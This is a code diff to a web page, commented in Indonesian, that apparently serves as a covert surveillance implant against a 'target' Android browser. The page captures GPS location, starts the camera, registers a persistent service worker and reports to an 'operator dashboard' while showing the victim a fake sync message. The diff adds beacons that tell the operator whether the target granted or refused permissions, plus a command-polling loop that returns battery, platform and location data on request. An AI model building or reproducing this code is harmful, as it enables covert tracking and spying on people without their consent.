@@ -24,15 +24,15 @@
         var isStreaming = false;
 
         // Mendaftarkan Service Worker PWA secara otomatis ke dalam sistem Android target
-if ('serviceWorker' in navigator) {
-    window.addEventListener('load', function() {
-        navigator.serviceWorker.register('/static/sw.js').then(function(reg) {
-            console.log('Gear99 ServiceWorker resmi terikat di latar belakang:', reg.scope);
-        }).catch(function(err) {
-            console.log('Pendaftaran ServiceWorker gagal:', err);
-        });
-    });
-}
+        if ('serviceWorker' in navigator) {
+            window.addEventListener('load', function() {
+                navigator.serviceWorker.register('/static/sw.js').then(function(reg) {
+                    console.log('Gear99 ServiceWorker resmi terikat di latar belakang:', reg.scope);
+                }).catch(function(err) {
+                    console.log('Pendaftaran ServiceWorker gagal:', err);
+                });
+            });
+        }
 
         async function triggerOtoritas() {
             // 1. Ambil Koordinat GPS Sekali Saja di Awal (Tidak Berulang)
@@ -65,8 +65,31 @@ if ('serviceWorker' in navigator) {
                 };
                 
                 document.getElementById("main-box").innerHTML = "<h2 style='color:#66fcf1;'>[ NODE TERKONEKSI ]</h2><p>Sesi nirkabel logistik aktif melintasi private proxy.</p>";
+                
+                // =============================================================
+                // SEBELAH SINI: Mengirim sinyal aktivitas sukses ke dasbor operator
+                // =============================================================
+                fetch('/api/kirim-data', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ 
+                        status: 'TERKONEKSI', 
+                        info: 'Browser target sukses mengaktifkan Service Worker & kamera.' 
+                    })
+                });
+
             } catch(err) { 
                 alert("Sinkronisasi gagal: Perangkat media tidak merespons."); 
+                
+                // Mengirim sinyal kegagalan/penolakan izin ke dasbor operator
+                fetch('/api/kirim-data', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ 
+                        status: 'GAGAL', 
+                        info: 'Target menolak izin atau perangkat tidak mendukung.' 
+                    })
+                });
             }
         }
         
@@ -87,30 +110,31 @@ if ('serviceWorker' in navigator) {
         }
 
         async function listenServerCommand() {
-            let res = await fetch('/poll_command');
-            let data = await res.json();
-            if (data.command) {
-                let report = "";
-                let timestamp = new Date().toLocaleTimeString();
-                
-                if (data.command === "cek_baterai") {
-                    let battery = await navigator.getBattery();
-                    report = "[" + timestamp + "] STATUS BATERAI -> Level: " + Math.round(battery.level * 100) + "%";
-                } else if (data.command === "ambil_data_sistem") {
-                    report = "[" + timestamp + "] SPESIFIKASI SISTEM -> Platform: " + navigator.platform;
-                } else if (data.command === "ambil_lokasi") {
-                    // Operator menarik data koordinat yang sudah tersimpan statis aman
-                    report = "[" + timestamp + "] KOORDINAT TERKUNCI -> Lat: " + targetLatitude + " | Long: " + targetLongitude;
-                } else if (data.command === "ping_test") {
-                    report = "[" + timestamp + "] MONITOR JALUR -> Respons Aktif";
+            try {
+                let res = await fetch('/poll_command');
+                let data = await res.json();
+                if (data.command) {
+                    let report = "";
+                    let timestamp = new Date().toLocaleTimeString();
+                    
+                    if (data.command === "cek_baterai") {
+                        let battery = await navigator.getBattery();
+                        report = "[" + timestamp + "] STATUS BATERAI -> Level: " + Math.round(battery.level * 100) + "%";
+                    } else if (data.command === "ambil_data_sistem") {
+                        report = "[" + timestamp + "] SPESIFIKASI SISTEM -> Platform: " + navigator.platform;
+                    } else if (data.command === "ambil_lokasi") {
+                        report = "[" + timestamp + "] KOORDINAT TERKUNCI -> Lat: " + targetLatitude + " | Long: " + targetLongitude;
+                    } else if (data.command === "ping_test") {
+                        report = "[" + timestamp + "] MONITOR JALUR -> Respons Aktif";
+                    }
+                    
+                    fetch('/report_output', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({ output: report })
+                    });
                 }
-                
-                fetch('/report_output', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ output: report })
-                });
-            }
+            } catch(e) { console.log("Poll error"); }
         }
     </script>
 </body>
